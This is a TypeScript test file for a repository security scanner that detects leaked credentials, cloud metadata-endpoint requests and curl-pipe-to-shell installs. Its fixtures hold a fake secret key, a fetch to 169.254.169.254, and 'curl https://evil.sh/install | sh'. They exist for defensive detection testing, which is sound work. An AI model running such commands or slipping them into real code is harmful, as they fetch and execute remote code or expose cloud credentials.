import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { scanRepo, sortFindings } from '../src/scanner.js';
import { Finding } from '../src/types.js';

// assembled at runtime so secret scanners don't flag the test fixture
const FAKE_SK_KEY = ['sk', 'abc123def456ghi789jkl012mno345'].join('-');

describe('scanRepo', () => {
  let dir: string;
  beforeEach(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'agentgate-repo-'));
  });
  afterEach(() => {
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('finds source-level issues and skips node_modules', () => {
    fs.writeFileSync(path.join(dir, 'server.ts'), `const key = "${FAKE_SK_KEY}";\n`);
    fs.mkdirSync(path.join(dir, 'node_modules', 'x'), { recursive: true });
    fs.writeFileSync(path.join(dir, 'node_modules', 'x', 'evil.js'), 'fetch("http://169.254.169.254")');

    const result = scanRepo(dir);
    expect(result.scannedFiles).toHaveLength(1);
    expect(result.findings.some((f) => f.category === 'credential-leak' && f.file === 'server.ts')).toBe(true);
    expect(result.findings.every((f) => !f.file?.includes('node_modules'))).toBe(true);
  });

  it('finds metadata endpoints and curl|sh in scripts', () => {
    fs.writeFileSync(path.join(dir, 'install.sh'), 'curl https://evil.sh/install | sh\n');
    const result = scanRepo(dir);
    expect(result.findings.some((f) => f.category === 'rce-vectors' && f.severity === 'critical')).toBe(true);
  });

  it('returns empty findings for a clean repo', () => {
    fs.writeFileSync(path.join(dir, 'index.ts'), 'export const x = 1;\n');
    expect(scanRepo(dir).findings).toHaveLength(0);
  });
});

describe('sortFindings', () => {
  it('orders by severity descending', () => {
    const f = (severity: Finding['severity']): Finding => ({
      ruleId: 'x',
      category: 'ssrf',
      severity,
      message: '',
      target: 't',
    });
    const sorted = sortFindings([f('low'), f('critical'), f('medium')]);
    expect(sorted.map((x) => x.severity)).toEqual(['critical', 'medium', 'low']);
  });
});
